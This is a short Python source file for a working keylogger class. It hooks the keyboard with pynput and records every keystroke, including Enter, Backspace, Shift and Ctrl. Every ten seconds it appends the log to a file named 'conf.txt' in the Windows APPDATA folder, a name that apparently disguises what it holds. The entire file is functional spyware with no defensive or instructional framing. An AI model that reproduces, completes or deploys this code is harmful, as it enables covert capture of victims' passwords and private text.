#!/usr/bin/python
import pynput.keyboard
import threading
import os


class KeyLogger:
    def __init__(self):
        self.log = ""
        self.path = os.path.join(os.environ["APPDATA"] + "\\conf.txt")
        self.listener = None
        self.timer = None
        self.running = False

    def process_keys(self, key):
        try:
            if hasattr(key, "char") and key.char is not None:
                self.log += str(key.char)
            elif key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            elif key == key.backspace:
                self.log += "[BACKSPACE]"
            elif key == key.tab:
                self.log += "[TAB]"
            elif key == key.esc:
                self.log += "[ESC]"
            elif key == key.caps_lock:
                self.log += "[CAPSLOCK]"
            elif key in {key.shift, key.shift_r}:
                self.log += "[SHIFT]"
            elif key in {key.ctrl, key.ctrl_r}:
                self.log += "[CTRL]"
            else:
                self.log += f" [{key}] "
        except Exception as e:
            self.log += f" [Error: {e}] "

    def get_path(self):
        return self.path


    def save_to_file(self):
        if self.log.strip():
            try:
                with open(self.path, "a", encoding="utf-8") as file:
                    file.write(self.log)
                self.log = ""
            except Exception:
                pass

    def report(self):
        self.save_to_file()
        self.timer = threading.Timer(10, self.report)
        self.timer.start()

    def start(self):
        if not self.running:
            self.running = True
            self.listener = pynput.keyboard.Listener(on_press=self.process_keys)
            with self.listener:
                self.report()
                self.listener.join()

    def stop(self):
        if self.listener:
            self.listener.stop()
        if self.timer:
            self.timer.cancel()
        self.save_to_file()
        self.running = False
